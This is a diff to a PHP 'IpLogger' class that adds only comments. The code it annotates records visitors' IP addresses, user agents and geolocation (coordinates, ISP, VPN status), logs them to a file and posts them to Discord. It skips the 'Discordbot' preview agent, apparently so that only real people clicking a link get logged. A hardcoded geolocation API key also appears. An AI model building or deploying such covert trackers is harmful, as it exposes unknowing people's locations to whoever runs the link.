@@ -5,13 +5,17 @@ class IpLogger {
         $ip = $_SERVER['REMOTE_ADDR'];
         $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
+        // Check if the user agent is a known bot or web crawler or Discord
         if ($this->isBot($userAgent) || $this->isDiscordUserAgent($userAgent)) {
+            // Skip logging if it's a bot, web crawler, or Discord user agent
             return;
         }
 
+        // Get IP geolocation data
         $geoData = $this->getIpGeoData($ip);
 
         if ($geoData === null) {
+            // If we can't get geolocation data, log an error and return
             error_log("Failed to retrieve geolocation data for IP: $ip");
             return;
         }
@@ -26,6 +30,7 @@ class IpLogger {
             error_log("Failed to open file for writing: $filename");
         }
 
+        // Send data to Discord
         $discord = new Discord();
         $response = $discord->sendIpToDiscord($ip, $userAgent, $geoData);
         if ($response === false) {
@@ -34,7 +39,7 @@ class IpLogger {
     }
 
     private function getIpGeoData($ip) {
-        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8';
+        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // Replace with your ipgeolocation.io API key
         $url = "https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip";
 
         $curl = curl_init($url);
@@ -53,7 +58,7 @@ class IpLogger {
             return [
                 'latitude' => $data['latitude'],
                 'longitude' => $data['longitude'],
-                'is_vpn' => $data['is_vpn'] ?? false,
+                'is_vpn' => $data['is_vpn'] ?? false, // Optional field for VPN detection
                 'isp' => $data['isp'] ?? 'Unknown'
             ];
         } else {
@@ -78,6 +83,8 @@ class IpLogger {
     }
 
     private function isDiscordUserAgent($userAgent) {
+        // Simple check for Discord user agent
+        // You might need to adjust this based on the exact user agent strings you want to filter out
         return stripos($userAgent, 'Discordbot') !== false;
     }
 }
